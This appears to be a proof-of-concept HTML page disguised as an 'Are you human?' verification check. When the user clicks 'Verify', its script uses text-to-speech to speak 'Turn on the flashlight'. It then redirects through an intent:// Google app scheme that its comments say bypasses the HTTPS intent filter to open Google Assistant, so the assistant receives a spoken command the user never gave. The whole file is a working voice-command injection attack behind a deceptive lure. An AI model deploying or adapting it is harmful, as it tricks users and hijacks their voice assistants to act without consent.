<!DOCTYPE html>
<html>
<head>
    <title>Verification Required</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #121212; color: white; }
        .box { padding: 30px; border: 1px solid #333; border-radius: 15px; text-align: center; }
        #btn { padding: 15px 30px; background: #4285f4; color: white; border: none; border-radius: 5px; font-size: 18px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="box">
        <h2>Are you human?</h2>
        <p>Click "Verify" to continue.</p>
        <button id="btn">Verify</button>
    </div>

    <script>
        const btn = document.getElementById('btn');
        
        btn.addEventListener('click', function() {
            // 1. Unlock TTS engine immediately
            let unlock = new SpeechSynthesisUtterance("");
            window.speechSynthesis.speak(unlock);

            // 2. Queue the Payload
            // Using a slightly longer delay (800ms) to ensure the Google App 
            // internal transition is complete before speaking.
            setTimeout(() => {
                let msg = new SpeechSynthesisUtterance("Turn on the flashlight");
                msg.lang = 'en-US';
                msg.rate = 1.2;
                window.speechSynthesis.speak(msg);
            }, 800);

            // 3. Trigger via internal Google App Scheme
            // This bypasses the standard HTTPS intent filter and hits the internal 
            // Assistant 'interaction' entry point directly.
            let googleSchemeUrl = "intent://assistant#Intent;" +
                "scheme=googleapp;" +
                "package=com.google.android.googlequicksearchbox;" +
                "S.com.google.android.apps.gsa.customtabs.SOURCE=1;" +
                "action=android.intent.action.VIEW;" +
                "end";
            
            window.location.href = googleSchemeUrl;
        });
    </script>
</body>
</html>
